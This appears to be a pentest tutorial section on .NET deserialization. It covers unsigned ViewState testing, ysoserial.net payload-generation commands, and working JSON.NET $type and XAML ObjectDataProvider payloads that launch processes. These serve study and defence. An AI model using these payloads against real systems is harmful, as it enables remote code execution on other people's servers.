# 15.05 — .NET Deserialization

## .NET Serialization Formats

```
.NET HAS MULTIPLE SERIALIZATION FORMATS:

BinaryFormatter:
  → Most dangerous! Leads to RCE.
  → Binary format, often base64 in cookies/POST body
  → Deprecated in .NET 5+, removed from .NET 8+
  → Still in many legacy apps

ViewState:
  → ASP.NET's mechanism to persist page state across requests
  → Stored in __VIEWSTATE hidden form field
  → Base64 encoded, may be HMAC signed or not
  → If unsigned → modify to inject objects → RCE!

XmlSerializer:
  → Generally safer (no code execution gadgets)
  → But type confusion attacks possible

DataContractSerializer:
  → Type confusion attacks if types not restricted

JSON.NET (Newtonsoft):
  → TypeNameHandling.All/Auto → deserialization attacks!
  → Can instantiate arbitrary types from JSON
  
LosFormatter (ViewState internal):
  → Used by WebForms for ViewState
  → No HMAC = dangerous
```

## ViewState — Identify and Attack

```bash
# VIEWSTATE IS IN HTML FORM:
# <input type="hidden" name="__VIEWSTATE" value="/wEPDw8PFgIeA..." />

# STEP 1: FIND VIEWSTATE IN BURP:
# GET/POST request → Response body → search for __VIEWSTATE

# STEP 2: CHECK IF MAC PROTECTED:
# Send modified __VIEWSTATE → if app throws error about MAC validation
# → HMAC protected → harder to attack
# If app accepts modified ViewState silently → NOT protected → vulnerable!

# STEP 3: DECODE AND INSPECT:
python3 -c "
import base64
vs = '/wEPDw8PFgIeA...YOUR_VIEWSTATE_HERE...'
decoded = base64.b64decode(vs)
print(decoded[:100])  # check for readable content
"

# STEP 4: CHECK ENCRYPTION AND MAC FLAGS:
# In web.config: <pages enableViewStateMac='true' viewStateEncryptionMode='...'>
# Burp Scanner can detect unsigned ViewState!

# STEP 5: GENERATE VIEWSTATE EXPLOIT WITH ysoserial.net:
```

## ysoserial.net Tool

```bash
# DOWNLOAD:
# https://github.com/pwntester/ysoserial.net/releases

# LIST FORMATTERS AND GADGETS:
./ysoserial.exe --list

# GENERATE VIEWSTATE PAYLOAD:
# For unsigned ViewState (no MAC):
./ysoserial.exe -o base64 -g TypeConfuseDelegate -f LosFormatter -c "id"

# FOR SIGNED VIEWSTATE (if you have the MachineKey):
./ysoserial.exe -o base64 -g TypeConfuseDelegate -f LosFormatter \
  -c "id" --isViewState --validationalg="SHA1" \
  --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF"

# FOR BinaryFormatter:
./ysoserial.exe -o base64 -g TypeConfuseDelegate -f BinaryFormatter -c "id"

# FOR JSON.NET:
./ysoserial.exe -o raw -g ObjectDataProvider -f Json.Net -c "id"

# GADGET CHAINS:
# TypeConfuseDelegate → for BinaryFormatter, LosFormatter, NetDataContractSerializer
# ObjectDataProvider  → for JSON.NET, XmlSerializer, DataContractJsonSerializer
# ActivitySurrogateSelector → for DataContractSerializer, XamlReader
```

## JSON.NET TypeNameHandling Attack

```json
// IF APP USES JSON.NET WITH TypeNameHandling.All OR TypeNameHandling.Auto:

// NORMAL JSON:
{"Name": "Alice", "Role": "user"}

// MALICIOUS JSON (type confusion):
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c calc.exe"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}

// EFFECT: JSON.NET instantiates ObjectDataProvider
// which calls Process.Start("cmd", "/c calc.exe") → RCE!

// GENERATE WITH ysoserial.net:
./ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c calc.exe" -o raw
```

## .NET XAML/BAML Deserialization

```

  XML-based markup for .NET UI
  XamlReader.Load() deserializes XAML
  
  MALICIOUS XAML:
  <ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
                      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                      xmlns:System="clr-namespace:System;assembly=mscorlib"
                      xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
    <ObjectDataProvider x:Key="LaunchCalc" ObjectType="{x:Type Diag:Process}" MethodName="Start">
      <ObjectDataProvider.MethodParameters>
        <System:String>cmd</System:String>
        <System:String>/c id</System:String>
      </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
  </ResourceDictionary>
  
  WHEN PROCESSED BY XamlReader.Load() → cmd /c id executes!
```
